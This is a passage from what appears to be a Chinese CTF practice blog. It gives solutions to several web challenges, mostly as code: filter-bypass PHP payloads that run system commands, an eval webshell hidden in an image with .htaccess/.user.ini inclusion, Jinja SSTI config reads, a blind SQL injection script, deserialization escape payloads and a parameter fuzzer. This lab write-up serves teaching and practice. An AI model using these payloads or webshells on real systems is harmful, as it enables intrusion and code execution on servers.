class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"hex2bin"</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">"5f474554"</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$pi</span>=hex2bin("5f474554") =&gt; $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">abs</span>&#125;) =&gt; (<span class="symbol">$</span>_GET)&#123;<span class="built-in">pi</span>&#125;(<span class="symbol">$</span>_GET)&#123;<span class="built-in">abs</span>&#125;  <span class="comment">//&#123;&#125;可以代替[]</span></span><br></pre></td></tr></table></figure><p>payload2:</p><p><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</code></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"exec"</span></span><br><span class="line">$pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">"getallheaders"</span></span><br><span class="line">exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200812222109098.png" alt="image-20200812222109098"></p><p>payload3:</p><p>通过白名单和数字异或出 <code>_GET或_POST</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$list = [<span class="string">'_G'</span>,<span class="string">'ET'</span>];</span><br><span class="line"></span><br><span class="line">$payload = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">for</span>($t=<span class="number">0</span>;$t&lt;sizeof($list);$t++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;sizeof($payload);$k++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line"></span><br><span class="line">                $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">                <span class="keyword">if</span>($exp == $list[$t])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></p><h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p><code>.hatcess</code></p><p><code>SetHandler application/x-httpd-php</code></p><p><code>图片马</code></p><p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code></p><p>Nginx 可以利用 <code>.user.ini</code> 自动包含文件</p><p><code>auto_prepend_file=xx.jpg</code></p><h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) </span><br><span class="line">        + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>禁用 <code>()</code> RCE无缘</p><p>内置函数，比如<code>url_for</code>和<code>get_flashed_messages</code>读取配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)</span><br><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>又是一道SSTI</p><p>抓包发现 user存在SSTI注入，参考<a href="[https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-PHP-%E5%AE%9E%E4%BE%8B](https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#1-PHP-实例)">k0rz3n师傅的文章</a></p><p><img src="/2020/08/8月刷题记录/image-20200813101645436.png" alt="image-20200813101645436"></p><h3 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h3><p>扫一下目录，发现了robots.txt,直接访问hint.txt</p><p>得到 <code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code></p><p>禁用了一下关键字</p><p><img src="/2020/08/8月刷题记录/image-20200813210653330.png" alt="image-20200813210653330"></p><p>这里 <code>username</code>传入 <code>\</code> 就会把 <code>&#39;</code>转义破坏语句结构</p><p><code>username=\&amp;password=or/**/1&gt;0#</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'\'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'     or/**/1&gt;0#'</span></span><br></pre></td></tr></table></figure><p><code>1&gt;0 返回  BJD needs to be stronger</code></p><p><code>1&lt;0 返回  You konw ,P3rh4ps needs a girl friend</code></p><p>然后写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://70c88c86-504f-479c-be1d-0324c8bcbb17.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"username"</span>:<span class="string">"\\"</span>,<span class="string">"password"</span>:<span class="string">""</span>&#125;</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#print(mid)</span></span><br><span class="line">        payload = <span class="string">"or if(ascii(substr(username,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i, mid)</span><br><span class="line">        payload = <span class="string">"or if(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i, mid)</span><br><span class="line">        data[<span class="string">'password'</span>] = payload</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"stronger"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    last = result</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h3 id="2019-easy-serialize-php"><a href="#2019-easy-serialize-php" class="headerlink" title="[2019]easy_serialize_php"></a>[2019]easy_serialize_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>extract($_POST);</code>导致变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">"size"</span>=&gt;<span class="string">"2"</span>,<span class="string">"color"</span>=&gt;<span class="string">"blue"</span>);</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">extract(<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="keyword">array</span>(<span class="string">"year"</span>,<span class="string">"2020"</span>)));</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p>所以<code>$_SESSION</code>是可控的，通过<code>filter()</code>改变序列化字符串，从而可控<code>img</code>的值</p><p>payload1:<code>值逃逸</code>，这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对</p><p>payload2:<code>键逃逸</code>，这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = <span class="string">"show_image"</span> ;</span><br><span class="line"><span class="comment">//payload1</span></span><br><span class="line">$b=<span class="keyword">array</span>(<span class="string">"_SESSION"</span>=&gt;<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">"flagflagflagflagflagflag"</span>,<span class="string">"function"</span>=&gt;<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;'</span>));</span><br><span class="line"><span class="comment">//payload2</span></span><br><span class="line"><span class="comment">//$b=array("_SESSION"=&gt;array("flagphp"=&gt;';s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'));</span></span><br><span class="line">extract($b);</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line">var_dump($serialize_info);</span><br><span class="line"></span><br><span class="line">$userinfo = unserialize($serialize_info);</span><br><span class="line">var_dump($userinfo);</span><br></pre></td></tr></table></figure><p>接着读flag就行</p><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>抓包后，读源码</p><p><img src="/2020/08/8月刷题记录/image-20200815235733909.png" alt="image-20200815235733909"></p><p>过滤很多，但有个反序列化函数没被禁用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">"ls"</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">"system"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200816000143586.png" alt="image-20200816000143586"></p><p>命名空间绕过黑名单</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=\system&amp;p=cat <span class="constructor">$(<span class="params">find</span> <span class="operator">/</span> -<span class="params">name</span> <span class="params">flag</span><span class="operator">*</span>)</span></span><br></pre></td></tr></table></figure><h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>写脚本爆破GET和POST参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line">import Queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'echo "hello_qwb_qwb";'</span></span><br><span class="line">url = <span class="string">'http://127.0.0.1/src/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz(filename):</span><br><span class="line">    file = open(<span class="string">"./src/"</span> + filename, <span class="string">"r"</span>)</span><br><span class="line">    # <span class="builtin-name">print</span> <span class="string">"[*]open:"</span> + filename</span><br><span class="line">    text = file.read()</span><br><span class="line"></span><br><span class="line">    getpattern = re.compile(r<span class="string">'\$_GET\[\'</span>(.*)\<span class="string">'\]'</span>)</span><br><span class="line">    <span class="builtin-name">get</span> = getpattern.findall(text)</span><br><span class="line"></span><br><span class="line">    postpattern = re.compile(r<span class="string">'\$_POST\[\'</span>(.*)\<span class="string">'\]'</span>)</span><br><span class="line">    post = postpattern.findall(text)</span><br><span class="line"></span><br><span class="line">    file_url = url + filename</span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> get:</span><br><span class="line">        r = requests.<span class="builtin-name">get</span>(file_url + <span class="string">"?"</span> + g + <span class="string">"="</span> + urllib.quote(payload))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hello_qwb_qwb"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]file:"</span> + filename)</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]get:"</span> + g)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> post:</span><br><span class="line">        data = &#123;p: payload&#125;</span><br><span class="line">        r = requests.post(file_url, <span class="attribute">data</span>=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hello_qwb_qwb"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]flie:"</span> + filename)</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]post:"</span> + p)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"[*]finish:"</span> + filename)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TextThread(threading.Thread):</span><br><span class="line">    def __init__(self, queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.__queue = queue</span><br><span class="line"></span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        global text</span><br><span class="line">       <span class="built_in"> queue </span>= self.__queue</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> queue.empty():</span><br><span class="line">            filename = queue.<span class="builtin-name">get</span>()</span><br><span class="line">            fuzz(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">   <span class="built_in"> queue </span>= Queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(<span class="string">'./src'</span>):</span><br><span class="line">        queue.put(filename)</span><br><span class="line"></span><br><span class="line">    thread_count = 8</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, thread_count):</span><br><span class="line">        thread = TextThread(queue)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
